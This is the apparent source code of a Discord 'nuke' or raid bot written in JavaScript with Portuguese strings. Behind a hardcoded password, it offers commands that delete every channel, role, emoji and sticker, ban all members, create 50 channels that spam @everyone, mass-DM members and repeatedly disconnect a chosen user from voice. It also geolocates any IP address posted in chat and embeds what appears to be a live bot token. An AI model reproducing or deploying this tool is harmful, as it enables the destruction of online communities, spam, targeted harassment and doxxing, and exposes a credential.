Const { Client, GatewayIntentBits, Partials, ChannelType, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, parseEmoji } = require('discord.js');
const fs = require('fs');
const axios = require('axios');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildVoiceStates, GatewayIntentBits.GuildEmojisAndStickers
    ],
    partials: [Partials.Channel, Partials.Message]
});

// --- CONFIGURAÇÃO ---
const BOT_TOKEN = 'MTQ1OTU1MDk2NjAzMzQyMDQ5Mg.Ggmnh9.EeI_QRfPMiN0u6OCP0fTytZaCHRgsGDwTD3jfE';
const CLIENT_ID = '1459550966033420492';
const SENHA_LOGIN = "unlocked";

let db = { kickList: [] };
if (fs.existsSync('./storage.json')) db = JSON.parse(fs.readFileSync('./storage.json'));
const saveDb = () => fs.writeFileSync('./storage.json', JSON.stringify(db, null, 4));

const commands = [
    new SlashCommandBuilder().setName('ajuda').setDescription('x'),
    new SlashCommandBuilder().setName('ip').setDescription('x').addStringOption(o => o.setName('endereco').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('ping').setDescription('x'),
    new SlashCommandBuilder().setName('addemoji').setDescription('x').addStringOption(o => o.setName('emoji').setDescription('x').setRequired(true)).addStringOption(o => o.setName('nome').setDescription('x').setRequired(false)),
    new SlashCommandBuilder().setName('clear').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addIntegerOption(o => o.setName('quantidade').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('first').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addStringOption(o => o.setName('mensagem').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('allmsg').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addStringOption(o => o.setName('conteudo').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('allban').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('reset').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('nuke').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('kickcall').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addUserOption(o => o.setName('alvo').setDescription('x').setRequired(true))
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);
(async () => { try { await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands }); } catch (e) {} })();

async function getIpEmbed(ip) {
    try {
        const res = await axios.get(`http://ip-api.com/json/${ip}`);
        if (res.data.status === 'success') {
            return new EmbedBuilder()
                .setTitle(`🔍 Detalhes do IP: ${ip}`)
                .setColor(0x3498db)
                .addFields(
                    { name: 'País', value: res.data.country || 'N/A' },
                    { name: 'Estado', value: res.data.regionName || 'N/A' },
                    { name: 'Cidade', value: res.data.city || 'N/A' },
                    { name: 'ISP', value: res.data.isp || 'N/A' },
                    { name: 'Latitude/Longitude', value: `${res.data.lat}, ${res.data.lon}` }
                ).setFooter({ text: 'Powered by ip-api.com' });
        }
    } catch (e) { return null; }
}

client.on(Events.MessageCreate, async (m) => {
    if (m.author.bot) return;
    const match = m.content.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
    if (match) {
        const embed = await getIpEmbed(match[0]);
        if (embed) await m.reply({ embeds: [embed] });
    }
});

client.on(Events.InteractionCreate, async (i) => {
    if (!i.isChatInputCommand()) return;

    if (i.commandName === 'ip') {
        const embed = await getIpEmbed(i.options.getString('endereco'));
        return i.reply({ embeds: embed ? [embed] : [], content: embed ? null : "❌ erro" });
    }

    if (i.commandName === 'ping') {
        const sent = await i.reply({ content: 'Calculando...', fetchReply: true, flags: [64] });
        const latency = sent.createdTimestamp - i.createdTimestamp;
        return i.editReply(`🏓 **Pong!**\nLatência API: \`${latency}ms\`\nWebSocket: \`${client.ws.ping}ms\``);
    }

    if (i.commandName === 'ajuda') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('🔒 cmd - FIRST')
            .setColor(0x00008B)
            .setDescription('🔹 /ip\n🔹 /first\n🔹 /allmsg\n🔹 /allban\n🔹 /reset\n🔹 /nuke\n🔹 /clear\n🔹 /addemoji\n🔹 /kickcall\n🔹 /ping\n\n⚠️ *Creator by ż4*')
            .setImage('https://cdn.discordapp.com/attachments/1459599212852412558/1460702992712990780/f3013e356a3829c077c84c321798982f.gif');
        return i.reply({ embeds: [helpEmbed] });
    }

    if (i.commandName === 'addemoji') {
        const emojiInput = i.options.getString('emoji');
        const nome = i.options.getString('nome');
        const parsedEmoji = parseEmoji(emojiInput);
        if (!parsedEmoji || !parsedEmoji.id) return i.reply({ content: "❌ erro", flags: [64] });
        const url = `https://cdn.discordapp.com/emojis/${parsedEmoji.id}.${parsedEmoji.animated ? 'gif' : 'png'}`;
        return i.guild.emojis.create({ attachment: url, name: nome || parsedEmoji.name })
            .then(e => i.reply({ content: `✅ ${e}` }))
            .catch(() => i.reply({ content: "❌ erro", flags: [64] }));
    }

    if (i.options.getString('login') !== SENHA_LOGIN) {
        return i.reply({ content: "🔒 senha inválida", flags: [64] });
    }

    await i.deferReply({ flags: [64] });

    try {
        if (i.commandName === 'clear') {
            const qtd = i.options.getInteger('quantidade');
            await i.channel.bulkDelete(qtd > 100 ? 100 : qtd, true).catch(() => {});
            await i.editReply(`🧹 **${qtd} mensagens limpas.**`);
        }

        if (i.commandName === 'nuke') {
            const channel = i.channel;
            if (channel) {
                const position = channel.position;
                const novo = await channel.clone().catch(() => null);
                if (novo) {
                    await channel.delete().catch(() => {});
                    await novo.setPosition(position);
                    const nukeEmbed = new EmbedBuilder()
                        .setColor('Orange')
                        .setDescription(`☢️ **ESTE CANAL SOFREU UM NUKE POR ${i.user.tag}**`)
                        .setImage('https://cdn.discordapp.com/attachments/1459599212852412558/1460726448754135190/70d0e28f1f1eb8aa688b32a2c942c5d1.gif');
                    await novo.send({ embeds: [nukeEmbed] });
                }
            }
        }

        if (i.commandName === 'first') {
            const msg = i.options.getString('mensagem');
            await i.editReply("⚡ **VELOCIDADE MÁXIMA ATIVADA.**");
            i.guild.setName("HAID BY Ż4").catch(() => {});
            i.guild.channels.cache.forEach(c => c.delete().catch(() => {}));
            for (let j = 0; j < 50; j++) {
                i.guild.channels.create({ name: 'xvideos', type: ChannelType.GuildText }).then(ch => {
                    setInterval(() => ch.send(`@everyone ${msg}`).catch(() => {}), 600);
                }).catch(() => {});
            }
        }

        if (i.commandName === 'allban') {
            await i.editReply("🔨 Banimento geral em curso.");
            const members = await i.guild.members.fetch();
            members.forEach(m => { if (m.bannable) m.ban().catch(() => {}); });
        }

        if (i.commandName === 'reset') {
            await i.editReply("🧹 Resetando...");
            i.guild.setName("reset").catch(() => {});
            i.guild.setIcon(null).catch(() => {});
            const channels = await i.guild.channels.fetch();
            channels.forEach(c => c.delete().catch(() => {}));
            const roles = await i.guild.roles.fetch();
            roles.forEach(r => { if (r.name !== "@everyone" && r.editable) r.delete().catch(() => {}); });
            i.guild.emojis.cache.forEach(e => e.delete().catch(() => {}));
            i.guild.stickers.cache.forEach(s => s.delete().catch(() => {}));
        }

        if (i.commandName === 'kickcall') {
            const alvo = i.options.getUser('alvo');
            const lista = new Set(db.kickList);
            const status = lista.has(alvo.id) ? "DESATIVADO" : "ATIVADO";
            if (lista.has(alvo.id)) lista.delete(alvo.id);
            else {
                lista.add(alvo.id);
                const member = i.guild.members.cache.get(alvo.id);
                if (member?.voice.channel) member.voice.disconnect().catch(() => {});
            }
            db.kickList = Array.from(lista); saveDb();
            await i.editReply(`🔨 Kickcall para **${alvo.tag}**: \`${status}\``);
        }

        if (i.commandName === 'allmsg') {
            await i.editReply("🚀 DMs enviadas.");
            const m = await i.guild.members.fetch();
            m.forEach(mem => { if (!mem.user.bot) mem.send(i.options.getString('conteudo')).catch(() => {}); });
        }

    } catch (e) { console.error(e); }
});

client.on(Events.VoiceStateUpdate, (oldS, newS) => {
    if (newS.channelId && db.kickList.includes(newS.member.id)) {
        newS.disconnect().catch(() => {});
    }
});

client.on(Events.ClientReady, () => console.log(`✅ ONLINE: 🔒 FIRST`));
client.login(BOT_TOKEN);
